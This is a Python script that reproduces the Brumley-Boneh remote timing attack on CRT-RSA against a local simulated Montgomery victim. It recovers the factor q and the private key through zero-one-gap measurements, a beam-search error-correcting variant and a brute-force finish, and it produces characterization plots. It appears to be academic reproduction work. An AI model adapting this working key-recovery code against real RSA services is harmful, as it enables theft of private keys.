"""
Brumley-Boneh remote timing attack on CRT-RSA (this bundle's Montgomery core).

Reproduces the attack of D. Brumley & D. Boneh, "Remote Timing Attacks are
Practical" (USENIX Security 2003), against the CRT-RSA victim in bb_victim.py.

What is reproduced
------------------
* Chosen-input recovery of the secret factor q by a **binary search**, learning
  q from the most-significant bit down, exactly as in the paper's Section 3.
* The **zero-one gap** decision:  for guess g (top bits of q, rest 0) and
  ghi = g with the current bit set, submit both and look at
  delta = T(g) - T(ghi).  If the current bit of q is 0 then g < q < ghi, g lies
  just below a multiple of q (many Montgomery extra reductions, slow) while ghi
  lies just above (few reductions, fast) -> delta is large & positive.  If the
  bit is 1 then both lie below q -> delta is small.  (Schindler's channel,
  Brumley-Boneh eq. 1.)
* The R^{-1} trick (paper Step 2): the raw ciphertext is Montgomery-converted as
  c*R mod q, which scrambles the magnitude, so we submit c = g*R^{-1} mod N.
  The victim's conversion then yields exactly (g mod q) as the exponentiation
  base, preserving the magnitude that carries the signal.
* The two amplification knobs from Experiment 1:
    - sample size  s : query each value s times, take the median (beats noise).
    - neighborhood n : sum the times of g, g+1, ..., g+n-1 (a *strong* indicator
      out of individually weak ones).

Two timing oracles (this bundle's convention)
---------------------------------------------
* exact : the victim reports the exact extra-reduction count -> a noise-free
  oracle; recovers ALL of q and factors N deterministically (the software
  analogue of Dhem's fixed-clock smartcard).
* real  : the victim reports __rdtsc wall-clock seconds -> the genuine noisy
  channel; we recover the top bits and quantify the zero-one-gap separability.

Outputs (saved under bb_results/<timestamp>/)
----------------------------------------------
* figs/*.jpg  + figs/*_data.json  : characterization + result plots.
* collected.json                  : per-bit measurement records.
* results.json                    : parameters, recovered q, factorization,
                                     recovered d, per-bit accuracy, query count.

Run (from the bundle root, after building the DLL - see attack_refined/montmul_c.py):
    venv\\Scripts\\python.exe attack_brumley_boneh\\attack_brumley_boneh.py
Edit the __main__ CONFIG block for key size / timing / parameters.
"""

import json
import os
import sys
import time
from datetime import datetime

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402

from bb_victim import (  # noqa: E402
    CRTRSAVictim, generate_crt_key, load_crt_key, save_crt_key,
)


# --------------------------------------------------------------------------- #
# Small helpers.
# --------------------------------------------------------------------------- #
def _median(vals):
    s = sorted(vals)
    m = len(s)
    return s[m // 2] if m % 2 else 0.5 * (s[m // 2 - 1] + s[m // 2])


def _mean(vals):
    return sum(vals) / len(vals) if vals else 0.0


def _std(vals):
    if len(vals) < 2:
        return 0.0
    mu = _mean(vals)
    return (sum((v - mu) ** 2 for v in vals) / (len(vals) - 1)) ** 0.5


def _save_fig(fig, path_noext):
    for ext in (".jpg", ".png"):
        try:
            fig.savefig(path_noext + ext, dpi=110, bbox_inches="tight")
            plt.close(fig)
            return os.path.basename(path_noext + ext)
        except Exception:
            continue
    plt.close(fig)
    return None


def _dump_json(obj, path):
    with open(path, "w") as fh:
        json.dump(obj, fh, indent=2)


# --------------------------------------------------------------------------- #
# Measurement primitives (the attacker side).
# --------------------------------------------------------------------------- #
def cipher_for(g, radix_inv, n):
    """Ciphertext to submit so the exponentiation base becomes (g mod q):
    c = g * R^{-1} mod N  (Brumley-Boneh Step 2)."""
    return (g * radix_inv) % n


def neighborhood_time(victim, g, radix_inv, n, neigh, sample):
    """Aggregate oracle value T_g = sum_{k=0}^{neigh-1} median_s(measure(g+k))."""
    total = 0.0
    for k in range(neigh):
        c = cipher_for(g + k, radix_inv, n)
        if sample <= 1:
            total += victim.measure(c)
        else:
            total += _median([victim.measure(c) for _ in range(sample)])
    return total


def neighborhood_count(victim, g, radix_inv, n, neigh):
    """Aggregate the *exact* extra-reduction count over a neighborhood.

    Used only for the structural characterization figures (Fig 1, Fig 2b), which
    describe the leak itself (extra reductions) independently of the noisy
    wall-clock oracle -- so they stay clean in both exact and real runs."""
    total = 0
    for k in range(neigh):
        c = cipher_for(g + k, radix_inv, n)
        total += victim.decrypt_instrumented(c, do_time=False)["ex_total"]
    return total


# --------------------------------------------------------------------------- #
# The binary-search factor recovery (paper Section 3).
# --------------------------------------------------------------------------- #
def recover_factor(victim, radix_inv, qbits, neigh=64, sample=1,
                   tail_brute=0, adaptive_neigh=True, tau_frac=0.3,
                   verbose=True):
    """Recover the top bits of q via the zero-one gap.

    Recovers bits qbits-2 .. tail_brute (the top bit is 1 by definition of the
    bit length).  The lowest `tail_brute` bits are left for a cheap brute-force
    completion (standing in for the paper's Coppersmith finish).  Returns
    (prefix_g, records) where prefix_g has the recovered bits set and the
    tail_brute low bits zero.

    Decision (Brumley-Boneh, Section 3, Step 4): the *magnitude* of the zero-one
    gap decides the bit -- delta = T(g) - T(ghi) is LARGE when the bit is 0
    (g < q < ghi: g just below a multiple of q has many extra reductions, ghi
    just above has few) and SMALL when the bit is 1 (both below q, nearly equal
    reduction counts).  A signed rule fails because a 1-bit's small gap is noise
    and its sign is random; the paper uses "large vs small" with previous gaps
    as the reference.  We use tau = tau_frac * (running max positive gap): the
    0-bit gap is ~constant across positions, so this self-calibrates after the
    first 0-bit and cleanly separates the two clusters.
    """
    n, q = victim.n, victim.q
    g = 1 << (qbits - 1)                    # top bit of q is 1
    stop_bit = tail_brute                   # inclusive lowest gap-recovered bit
    records = []
    max_pos_delta = 0.0
    t0 = time.perf_counter()
    for idx, i in enumerate(range(qbits - 2, stop_bit - 1, -1)):
        ne = min(neigh, max(1, 1 << i)) if adaptive_neigh else neigh
        ghi = g | (1 << i)
        tg = neighborhood_time(victim, g, radix_inv, n, ne, sample)
        tghi = neighborhood_time(victim, ghi, radix_inv, n, ne, sample)
        delta = tg - tghi
        tau = tau_frac * max_pos_delta      # "large gap" threshold (self-calibrating)
        decided = 0 if delta > tau else 1   # 0-bit => large positive gap
        if delta > max_pos_delta:
            max_pos_delta = delta
        actual = (q >> i) & 1
        if decided == 1:
            g = ghi
        records.append({
            "bit": i, "Tg": tg, "Tghi": tghi, "delta": delta, "tau": tau,
            "decided": decided, "actual": actual, "neigh": ne,
            "correct": decided == actual,
        })
        if verbose and (idx % max(1, (qbits // 20)) == 0 or i == stop_bit):
            elapsed = time.perf_counter() - t0
            done = idx + 1
            total = qbits - 1 - stop_bit
            eta = elapsed / done * (total - done)
            acc = sum(r["correct"] for r in records) / len(records)
            sys.stdout.write(
                "\r  bit %3d/%3d | running acc %5.1f%% | elapsed %5.1fs eta %5.1fs   "
                % (done, total, 100 * acc, elapsed, eta))
            sys.stdout.flush()
    if verbose:
        sys.stdout.write("\n")
    return g, records


def complete_by_bruteforce(n, prefix, tail_brute, max_brute=26):
    """Finish factoring by trying the 2^tail_brute low-bit completions of the
    recovered prefix against N (stand-in for Coppersmith's finish).

    Returns None (without searching) when ``tail_brute > max_brute``: that many
    unrecovered low bits is an infeasible brute force -- it means the gap phase
    only recovered the top bits (e.g. a short `recover_bits` demo run), so there
    is nothing to complete.  This guard is what keeps a small-`recover_bits`
    real run from launching a 2^100+ loop."""
    if tail_brute <= 0:
        return prefix if (prefix > 1 and n % prefix == 0) else None
    if tail_brute > max_brute:
        return None
    for low in range(1 << tail_brute):
        cand = prefix | low
        if cand > 1 and n % cand == 0:
            return cand
    return None


# --------------------------------------------------------------------------- #
# Confidence-based beam / backtracking factor recovery.
#
# The greedy recover_factor() above is a *sequential* top-down binary search:
# each bit is committed irrevocably, so a single wrong decision on a marginal
# bit (delta ~ tau) corrupts the whole prefix and every subsequent bit becomes
# random.  On the noisy `real` oracle the per-bit error rate on marginal bits is
# well above what a 64-bit chain can tolerate (0.97**64 ~ 14 %), which is why
# full recovery derails at the first marginal bit while `exact` gets all of q.
#
# This is exactly the failure the Schindler-Koeune-Quisquater follow-up
# (Brumley-Boneh ref [21]) fixes with error detection / correction.  Here we
# port the beam-search idea already used in attack_refined.recover_exact():
# instead of one prefix we keep the `beam_width` best partial prefixes, each
# with a cumulative confidence score, and expand BOTH bit values at every step.
# A confident bit prunes its losing branch immediately; a marginal bit keeps
# both branches alive with near-equal score, so a locally-wrong choice can be
# out-scored later by the deeper evidence on the (still-alive) correct branch --
# i.e. the chain can be *revisited* instead of derailing.  Divisibility of N by
# the completed candidate is the ground-truth verifier that selects the winner.
#
# Per-bit confidence uses the same zero-one-gap decision as the greedy search:
#   margin = delta - tau,   delta = T(g) - T(ghi),   tau = tau_frac*max_pos_delta
# A large positive margin is strong evidence for bit 0 (g crosses a multiple of
# q -> many extra reductions); margin <= 0 is evidence for bit 1 (both guesses
# below q).  So the branch confidences are  conf(0) = +margin,  conf(1) = -margin
# (mirrors the `conf = margin if bit=="1" else -margin` convention in
# attack_refined).  tau/max_pos_delta are per-candidate path state, exactly as
# in the greedy version, so each surviving prefix self-calibrates independently.
# --------------------------------------------------------------------------- #
class _BeamCand:
    """One partial-prefix hypothesis carried by the beam."""
    __slots__ = ("g", "score", "max_pos_delta", "records")

    def __init__(self, g, score, max_pos_delta, records):
        self.g = g                          # prefix value (recovered bits set)
        self.score = score                  # cumulative confidence
        self.max_pos_delta = max_pos_delta  # running max +gap on THIS path
        self.records = records              # per-bit records along THIS path


def recover_factor_beam(victim, radix_inv, qbits, neigh=64, sample=1,
                        tail_brute=0, adaptive_neigh=True, tau_frac=0.3,
                        beam_width=8, verbose=True):
    """Beam / backtracking version of :func:`recover_factor`.

    Returns ``(prefix_g, records, q_rec)`` where ``prefix_g``/``records`` belong
    to the highest-scoring surviving path (for reporting/plots, same schema as
    the greedy recovery) and ``q_rec`` is a completed factor of N found among
    the beam leaves (via :func:`complete_by_bruteforce`) or ``None``.

    ``beam_width == 1`` reduces to the greedy search (with the same decisions),
    so this is a strict generalisation.
    """
    n, q = victim.n, victim.q
    stop_bit = tail_brute
    top = 1 << (qbits - 1)                   # top bit of q is 1 by definition
    beam = [_BeamCand(top, 0.0, 0.0, [])]

    # Cache neighborhood measurements by (g, ne): different beam paths (or the
    # bit-0 child of one prefix and the bit-1 child of another) can request the
    # same g, and the aggregate depends only on (g, ne).  Keeps the query count
    # from blowing up by the full beam_width where prefixes coincide.
    meas_cache = {}

    def measure_g(g, ne):
        key = (g, ne)
        val = meas_cache.get(key)
        if val is None:
            val = neighborhood_time(victim, g, radix_inv, n, ne, sample)
            meas_cache[key] = val
        return val

    total = qbits - 1 - stop_bit
    t0 = time.perf_counter()
    for idx, i in enumerate(range(qbits - 2, stop_bit - 1, -1)):
        ne = min(neigh, max(1, 1 << i)) if adaptive_neigh else neigh
        actual = (q >> i) & 1
        children = []
        seen = {}                            # dedup children by prefix value g
        for cand in beam:
            g = cand.g
            ghi = g | (1 << i)
            tg = measure_g(g, ne)
            tghi = measure_g(ghi, ne)
            delta = tg - tghi
            tau = tau_frac * cand.max_pos_delta
            margin = delta - tau
            new_max = delta if delta > cand.max_pos_delta else cand.max_pos_delta
            # Expand bit=1 before bit=0 so that on an exact tie (margin == 0 =>
            # delta == tau) the stable sort keeps bit 1, reproducing the greedy
            # rule `decided = 0 if delta > tau else 1` exactly at beam_width=1.
            for bit in (1, 0):
                child_g = ghi if bit == 1 else g
                conf = (-margin) if bit == 1 else margin
                rec = {
                    "bit": i, "Tg": tg, "Tghi": tghi, "delta": delta,
                    "tau": tau, "decided": bit, "actual": actual, "neigh": ne,
                    "correct": bit == actual,
                }
                new_score = cand.score + conf
                prev = seen.get(child_g)
                if prev is not None:
                    # same prefix reached two ways -> keep the better score only
                    if new_score > prev.score:
                        prev.score = new_score
                        prev.max_pos_delta = new_max
                        prev.records = cand.records + [rec]
                    continue
                nc = _BeamCand(child_g, new_score, new_max,
                               cand.records + [rec])
                seen[child_g] = nc
                children.append(nc)
        children.sort(key=lambda c: c.score, reverse=True)
        beam = children[:beam_width]

        if verbose and (idx % max(1, (qbits // 20)) == 0 or i == stop_bit):
            elapsed = time.perf_counter() - t0
            done = idx + 1
            eta = elapsed / done * (total - done)
            best = beam[0]
            acc = (sum(r["correct"] for r in best.records) / len(best.records)
                   if best.records else 0.0)
            sys.stdout.write(
                "\r  bit %3d/%3d | beam %3d | top-path acc %5.1f%% | "
                "queries %d | elapsed %5.1fs eta %5.1fs   "
                % (done, total, len(beam), 100 * acc, victim.queries,
                   elapsed, eta))
            sys.stdout.flush()
    if verbose:
        sys.stdout.write("\n")

    # Ground-truth completion: try to factor N from each surviving prefix, best
    # score first.  This is what lets a correct-but-not-top-scoring path win.
    q_rec = None
    for rank, cand in enumerate(sorted(beam, key=lambda c: c.score,
                                        reverse=True)):
        cand_q = complete_by_bruteforce(n, cand.g, stop_bit)
        if cand_q is not None:
            q_rec = cand_q
            if verbose:
                print("  [beam] N factored from beam rank %d/%d "
                      "(score %.4g)" % (rank + 1, len(beam), cand.score))
            break

    best = max(beam, key=lambda c: c.score)
    return best.g, best.records, q_rec


# --------------------------------------------------------------------------- #
# Characterization experiments (produce the paper's figures).
# --------------------------------------------------------------------------- #
def characterize_sawtooth(victim, radix_inv, lo_frac=0.5, hi_frac=2.6,
                          points=600, per_point_neigh=25):
    """Fig 1: extra reductions vs g, showing the discontinuity at q (and p)."""
    n, q, p = victim.n, victim.q, victim.p
    xs, ex_q, ex_p, ex_tot = [], [], [], []
    g_lo = int(q * lo_frac)
    g_hi = int(q * hi_frac)
    step = max(1, (g_hi - g_lo) // points)
    g = g_lo
    while g < g_hi:
        aq = ap = 0
        for k in range(per_point_neigh):
            c = cipher_for(g + k, radix_inv, n)
            info = victim.decrypt_instrumented(c, do_time=False)
            aq += info["ex_q"]
            ap += info["ex_p"]
        xs.append(g / q)
        ex_q.append(aq / per_point_neigh)
        ex_p.append(ap / per_point_neigh)
        ex_tot.append((aq + ap) / per_point_neigh)
        g += step
    return {
        "g_over_q": xs, "ex_q": ex_q, "ex_p": ex_p, "ex_total": ex_tot,
        "p_over_q": p / q, "per_point_neigh": per_point_neigh,
    }


def characterize_sample_convergence(victim, radix_inv, g=None, max_samples=40):
    """Fig 2a (real mode): spread of the timing estimate shrinks with samples."""
    n, q = victim.n, victim.q
    if g is None:
        g = int(q * 0.5)
    c = cipher_for(g, radix_inv, n)
    raw = [victim.measure(c) for _ in range(max_samples)]
    sizes, stds, med_err = [], [], []
    ref = _median(raw)
    for s in range(2, max_samples + 1):
        sizes.append(s)
        stds.append(_std(raw[:s]))
        med_err.append(abs(_median(raw[:s]) - ref))
    return {"sample_sizes": sizes, "std": stds, "median_drift": med_err,
            "raw_first": raw[:min(15, len(raw))]}


def characterize_neighborhood(victim, radix_inv, qbits,
                              neigh_sizes=(25, 50, 100, 200, 400, 800)):
    """Fig 2b: zero-one gap vs neighborhood size for a known bit=0 and bit=1.

    Uses the exact extra-reduction count (the structural leak, noise-free) so
    the plot is meaningful in both exact and real runs.  The true q is used only
    to *pick* one 0-bit and one 1-bit position to characterize (a diagnostic,
    not part of recovery)."""
    n, q = victim.n, victim.q
    bit0 = bit1 = None
    # search from mid-range downward: there a 0-bit is a clean q-crossing (large
    # gap) while a 1-bit keeps both guesses below q (genuinely small gap).
    hi = qbits // 2
    for i in range(hi, max(hi - 60, 1), -1):
        b = (q >> i) & 1
        if b == 0 and bit0 is None:
            bit0 = i
        if b == 1 and bit1 is None:
            bit1 = i
        if bit0 is not None and bit1 is not None:
            break

    def gap_at(i, neigh):
        prefix = (q >> (i + 1)) << (i + 1)        # correct bits above i
        g = prefix
        ghi = prefix | (1 << i)
        tg = neighborhood_count(victim, g, radix_inv, n, neigh)
        tghi = neighborhood_count(victim, ghi, radix_inv, n, neigh)
        return abs(tg - tghi)

    out = {"neigh_sizes": list(neigh_sizes), "bit0_index": bit0,
           "bit1_index": bit1, "gap_bit0": [], "gap_bit1": [],
           "unit": "extra reductions"}
    for nb in neigh_sizes:
        out["gap_bit0"].append(gap_at(bit0, nb) if bit0 is not None else 0.0)
        out["gap_bit1"].append(gap_at(bit1, nb) if bit1 is not None else 0.0)
    return out


# --------------------------------------------------------------------------- #
# Plotting.
# --------------------------------------------------------------------------- #
def plot_sawtooth(data, figs_dir, timing):
    unit = "extra reductions"
    fig, ax = plt.subplots(figsize=(9, 4.5))
    ax.plot(data["g_over_q"], data["ex_total"], lw=0.9, color="#1f77b4",
            label="total (mod p + mod q)")
    ax.plot(data["g_over_q"], data["ex_q"], lw=0.8, color="#d62728", alpha=0.8,
            label="mod q")
    for m in (1, 2):
        ax.axvline(m, color="k", ls="--", lw=0.8, alpha=0.6)
    ax.axvline(data["p_over_q"], color="green", ls=":", lw=1.0,
               label="g = p (=%.2f q)" % data["p_over_q"])
    ax.set_xlabel("g / q")
    ax.set_ylabel("avg %s (neigh=%d)" % (unit, data["per_point_neigh"]))
    ax.set_title("Fig 1 - Montgomery extra reductions vs g "
                 "(discontinuity at multiples of q, and at p)")
    ax.legend(fontsize=8)
    ax.grid(alpha=0.3)
    name = _save_fig(fig, os.path.join(figs_dir, "fig1_sawtooth_extra_reductions"))
    _dump_json(data, os.path.join(figs_dir, "fig1_sawtooth_data.json"))
    return name


def plot_sample_convergence(data, figs_dir):
    fig, ax = plt.subplots(figsize=(8, 4.5))
    ax.plot(data["sample_sizes"], data["std"], marker="o", ms=3,
            color="#1f77b4", label="std of samples")
    ax.plot(data["sample_sizes"], data["median_drift"], marker="s", ms=3,
            color="#d62728", label="|median - final median|")
    ax.set_xlabel("# samples for a fixed ciphertext")
    ax.set_ylabel("timing variation (seconds)")
    ax.set_title("Fig 2a - the timing estimate converges as samples increase")
    ax.legend(fontsize=8)
    ax.grid(alpha=0.3)
    name = _save_fig(fig, os.path.join(figs_dir, "fig2a_sample_convergence"))
    _dump_json(data, os.path.join(figs_dir, "fig2a_sample_convergence_data.json"))
    return name


def plot_neighborhood(data, figs_dir):
    fig, ax = plt.subplots(figsize=(8, 4.5))
    ax.plot(data["neigh_sizes"], data["gap_bit0"], marker="o", color="#d62728",
            label="bit = 0 (crossing q -> large gap)")
    ax.plot(data["neigh_sizes"], data["gap_bit1"], marker="s", color="#1f77b4",
            label="bit = 1 (both below q -> small gap)")
    ax.set_xlabel("neighborhood size n")
    ax.set_ylabel("|zero-one gap|  |T(g) - T(ghi)|  [extra reductions]")
    ax.set_title("Fig 2b - larger neighborhood widens the zero-one gap for 0-bits "
                 "(structural, exact counts)")
    ax.legend(fontsize=8)
    ax.grid(alpha=0.3)
    name = _save_fig(fig, os.path.join(figs_dir, "fig2b_neighborhood_gap"))
    _dump_json(data, os.path.join(figs_dir, "fig2b_neighborhood_gap_data.json"))
    return name


def plot_zero_one_gap(records, figs_dir, timing):
    bits0 = [r["bit"] for r in records if r["actual"] == 0]
    d0 = [r["delta"] for r in records if r["actual"] == 0]
    bits1 = [r["bit"] for r in records if r["actual"] == 1]
    d1 = [r["delta"] for r in records if r["actual"] == 1]
    unit = "extra reductions" if timing == "exact" else "seconds"

    fig, ax = plt.subplots(figsize=(10, 4.8))
    ax.scatter(bits0, d0, s=16, color="#d62728", label="actual bit = 0")
    ax.scatter(bits1, d1, s=16, color="#1f77b4", label="actual bit = 1")
    ax.axhline(0, color="k", lw=0.8)
    ax.set_xlabel("bit index of q (recovered MSB -> LSB)")
    ax.set_ylabel("zero-one gap  delta = T(g) - T(ghi)   [%s]" % unit)
    ax.set_title("Fig 3 - zero-one gap per bit: 0-bits sit above the axis, "
                 "1-bits on/below it (%s oracle)" % timing)
    ax.invert_xaxis()
    ax.legend(fontsize=8)
    ax.grid(alpha=0.3)
    name = _save_fig(fig, os.path.join(figs_dir, "fig3_zero_one_gap_vs_bit"))
    return name


def plot_gap_histogram(records, figs_dir, timing):
    d0 = [r["delta"] for r in records if r["actual"] == 0]
    d1 = [r["delta"] for r in records if r["actual"] == 1]
    unit = "extra reductions" if timing == "exact" else "seconds"
    fig, ax = plt.subplots(figsize=(8, 4.5))
    bins = 40
    if d0:
        ax.hist(d0, bins=bins, alpha=0.6, color="#d62728", label="actual bit = 0")
    if d1:
        ax.hist(d1, bins=bins, alpha=0.6, color="#1f77b4", label="actual bit = 1")
    ax.axvline(0, color="k", lw=0.8)
    ax.set_xlabel("zero-one gap delta [%s]" % unit)
    ax.set_ylabel("count")
    ax.set_title("Fig 4 - separability of the zero-one gap by true bit value")
    ax.legend(fontsize=8)
    ax.grid(alpha=0.3)
    name = _save_fig(fig, os.path.join(figs_dir, "fig4_gap_histogram"))
    return name


# --------------------------------------------------------------------------- #
# Orchestration.
# --------------------------------------------------------------------------- #
def run(key_bits=256, timing="exact", neigh=64, sample=1, batch=64, repeat=1,
        recover_bits=None, tail_brute=16, beam_width=1, make_plots=True,
        use_key_cache=True, results_root=None, cache_root=None, verbose=True):
    """Full attack + characterization + figures + JSON.  Returns results dict."""
    results_root = results_root or os.path.join(_HERE, "bb_results")
    cache_root = cache_root or os.path.join(_HERE, "bb_cache")
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    run_dir = os.path.join(results_root, "%s_%s_kb%d" % (ts, timing, key_bits))
    figs_dir = os.path.join(run_dir, "figs")
    os.makedirs(figs_dir, exist_ok=True)

    # --- key (cached so reruns hit the same target q) --- #
    key_dir = os.path.join(cache_root, "keybits_%d" % key_bits)
    os.makedirs(key_dir, exist_ok=True)
    key_path = os.path.join(key_dir, "key.json")
    if use_key_cache and os.path.exists(key_path):
        key = load_crt_key(key_path)
        if key["n"].bit_length() != key_bits:
            key = generate_crt_key(key_bits)
            save_crt_key(key_path, key)
    else:
        key = generate_crt_key(key_bits)
        save_crt_key(key_path, key)

    victim = CRTRSAVictim(key, timing=timing, batch=batch, repeat=repeat)
    n = victim.n
    qbits_true = victim.q.bit_length()
    qbits = (n.bit_length() + 1) // 2        # attacker estimate (balanced primes)
    R = victim.q_radix()                      # public Montgomery radix
    radix_inv = pow(R, -1, n)

    header = [
        "=" * 78,
        "BRUMLEY-BONEH REMOTE TIMING ATTACK on CRT-RSA (Montgomery extra reduction)",
        "=" * 78,
        "  modulus N        : %d bits" % n.bit_length(),
        "  target factor q  : %d bits (attacker estimate qbits=%d)"
        % (qbits_true, qbits),
        "  timing oracle    : %s" % timing,
        "  neighborhood n   : %d   sample size s : %d" % (neigh, sample),
        "  real batch/repeat: %d / %d" % (batch, repeat) if timing == "real"
        else "  (exact oracle: extra-reduction counts, noise-free)",
        "  R^{-1} trick     : submit c = g * R^{-1} mod N (base = g mod q)",
        "=" * 78,
    ]
    if verbose:
        print("\n".join(header))

    # --- characterization figures --- #
    fig_names = {}
    char_started = time.perf_counter()
    if make_plots:
        if verbose:
            print("[*] characterizing extra-reduction sawtooth (Fig 1) ...")
        saw = characterize_sawtooth(victim, radix_inv)
        fig_names["fig1"] = plot_sawtooth(saw, figs_dir, timing)

        if verbose:
            print("[*] characterizing neighborhood vs zero-one gap (Fig 2b) ...")
        # structural (exact-count) characterization -> cheap & clean in both modes
        nb = characterize_neighborhood(
            victim, radix_inv, qbits,
            neigh_sizes=(25, 50, 100, 200, 400, 800))
        fig_names["fig2b"] = plot_neighborhood(nb, figs_dir)

        if timing == "real":
            if verbose:
                print("[*] characterizing sample convergence (Fig 2a) ...")
            sc = characterize_sample_convergence(victim, radix_inv)
            fig_names["fig2a"] = plot_sample_convergence(sc, figs_dir)

    # --- factor recovery --- #
    # tail_brute (a cheap stand-in for the paper's Coppersmith finish) is now
    # honoured in BOTH oracle modes: with the beam it lets `real` complete the
    # factorization from a mostly-correct prefix, not just `exact`.
    if recover_bits is None:
        recover_bits = qbits - 1 - tail_brute
    # ensure the gap phase stops exactly at bit `tb`
    stop_bit = qbits - 1 - recover_bits
    tb = stop_bit
    use_beam = beam_width and beam_width > 1
    if verbose:
        print("[*] recovering q by %s (zero-one gap): "
              "bits %d..%d, then brute-force %d low bits"
              % ("beam search (width %d)" % beam_width if use_beam
                 else "greedy binary search", qbits - 2, stop_bit, tb))
    q_start = time.perf_counter()
    q_rec = None
    if use_beam:
        prefix, records, q_rec = recover_factor_beam(
            victim, radix_inv, qbits, neigh=neigh, sample=sample,
            tail_brute=tb, adaptive_neigh=True, beam_width=beam_width,
            verbose=verbose)
    else:
        prefix, records = recover_factor(
            victim, radix_inv, qbits, neigh=neigh, sample=sample,
            tail_brute=tb, adaptive_neigh=True, verbose=verbose)
    recover_secs = time.perf_counter() - q_start

    bits_correct = sum(r["correct"] for r in records)
    bits_total = len(records)
    first_error = next((r["bit"] for r in records if not r["correct"]), None)

    # --- completion / factorization --- #
    # The beam already attempts completion across its leaves and returns q_rec;
    # the greedy path completes from its single prefix here.  Works for exact
    # and real alike -- divisibility of N is the ground-truth verifier.
    factored = False
    d_rec = None
    if q_rec is None:
        q_rec = complete_by_bruteforce(n, prefix, tb)
    if q_rec is not None and n % q_rec == 0:
        factored = True
        p_rec = n // q_rec
        try:
            d_rec = pow(victim.e, -1, (p_rec - 1) * (q_rec - 1))
        except Exception:
            d_rec = None

    # --- result plots --- #
    if make_plots:
        fig_names["fig3"] = plot_zero_one_gap(records, figs_dir, timing)
        fig_names["fig4"] = plot_gap_histogram(records, figs_dir, timing)

    # --- persist collected data + results --- #
    _dump_json({"records": records}, os.path.join(run_dir, "collected.json"))

    results = {
        "attack": "brumley_boneh_crt_rsa_montgomery",
        "timestamp": ts,
        "params": {
            "key_bits": key_bits, "timing": timing, "neigh": neigh,
            "sample": sample, "batch": batch, "repeat": repeat,
            "tail_brute": tb, "adaptive_neigh": True,
            "beam_width": beam_width,
            "recovery": "beam" if use_beam else "greedy",
        },
        "modulus_bits": n.bit_length(),
        "qbits_true": qbits_true,
        "qbits_estimate": qbits,
        "bits_recovered_via_gap": bits_total,
        "bits_correct": bits_correct,
        "per_bit_accuracy": bits_correct / bits_total if bits_total else 0.0,
        "first_error_bit": first_error,
        "queries": victim.queries,
        "recover_seconds": recover_secs,
        "char_seconds": (q_start - char_started) if make_plots else 0.0,
        "factored": factored,
        "q_true": "%X" % victim.q,
        "q_recovered": ("%X" % q_rec) if q_rec else None,
        "d_recovered_matches": (d_rec == victim.d) if d_rec is not None else None,
        "figures": fig_names,
        "run_dir": run_dir,
    }
    _dump_json(results, os.path.join(run_dir, "results.json"))

    # --- terminal report --- #
    if verbose:
        print("-" * 78)
        print("RESULTS")
        print("-" * 78)
        print("  gap-phase per-bit accuracy : %d/%d = %.1f%%"
              % (bits_correct, bits_total,
                 100 * bits_correct / bits_total if bits_total else 0))
        if use_beam:
            print("  recovery method            : beam search (width %d)"
                  % beam_width)
        if first_error is not None:
            print("  first wrong bit (top path) : %d" % first_error)
        print("  decryption queries         : %d" % victim.queries)
        print("  recovery time              : %.1fs" % recover_secs)
        if factored:
            print("  FACTORED N  : q = %X" % q_rec)
            print("  d recovered : %s"
                  % ("MATCHES victim key" if d_rec == victim.d
                     else "mismatch"))
            print("  >>> SUCCESS: full private key recovered (%s oracle)"
                  % timing)
        elif timing == "exact":
            print("  >>> factorization NOT completed "
                  "(increase neigh / tail_brute / beam_width)")
        else:
            print("  >>> real oracle: N not factored this run; the top path's "
                  "top bits + Fig 3/4 quantify zero-one-gap separability.")
            print("      (raise beam_width / sample / neigh, or lower machine "
                  "noise, to close the chain.)")
        print("  artifacts in: %s" % run_dir)
        print("=" * 78)

    return results


# --------------------------------------------------------------------------- #
# In-code configuration (no environment variables), matching the bundle style.
# --------------------------------------------------------------------------- #
if __name__ == "__main__":
    # -------------------------------- CONFIG -------------------------------- #
    KEY_BITS = 256          # modulus size (balanced primes; q ~ KEY_BITS/2 bits)
    TIMING = "exact"        # "exact" (noise-free, factors N) | "real" (rdtsc)
    NEIGHBORHOOD = 64       # summed consecutive ciphertexts per guess
    SAMPLE_SIZE = 1         # median over this many measures (raise for real)
    TAIL_BRUTE = 16         # brute-force the lowest N bits at the end (both modes)
    BEAM_WIDTH = 1          # 1 = greedy binary search; >1 = confidence beam /
                            #     backtracking (fixes marginal-bit propagation on
                            #     the noisy `real` oracle -- try 8..32)
    BATCH = 64              # real mode: rdtsc-timed ladders averaged per half
    REPEAT = 1              # real mode: min over this many batch-averages
    MAKE_PLOTS = True
    USE_KEY_CACHE = True    # reuse the cached target key across runs
    # ------------------------------------------------------------------------ #

    run(key_bits=KEY_BITS, timing=TIMING, neigh=NEIGHBORHOOD,
        sample=SAMPLE_SIZE, batch=BATCH, repeat=REPEAT, tail_brute=TAIL_BRUTE,
        beam_width=BEAM_WIDTH, make_plots=MAKE_PLOTS, use_key_cache=USE_KEY_CACHE,
        verbose=True)
